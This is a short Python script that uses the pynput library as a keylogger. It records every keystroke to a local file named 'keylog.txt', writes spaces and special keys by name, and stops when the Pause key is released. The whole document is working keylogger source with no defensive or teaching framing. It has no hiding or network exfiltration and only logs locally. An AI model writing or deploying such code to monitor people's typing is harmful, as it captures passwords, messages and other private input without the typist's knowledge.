from pynput import keyboard

# When Key is pressed
def on_press(key):
    try:
        if key == keyboard.Key.space: 
            char_to_write = ' ' # When Space is pressed write ' ' instead of key.space
        else:
            char_to_write = key.char
        
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'{char_to_write}')
            
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'{key}')

# How to end program
def on_release(key):
    if key == keyboard.Key.pause:
        return False

# Listen for key events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()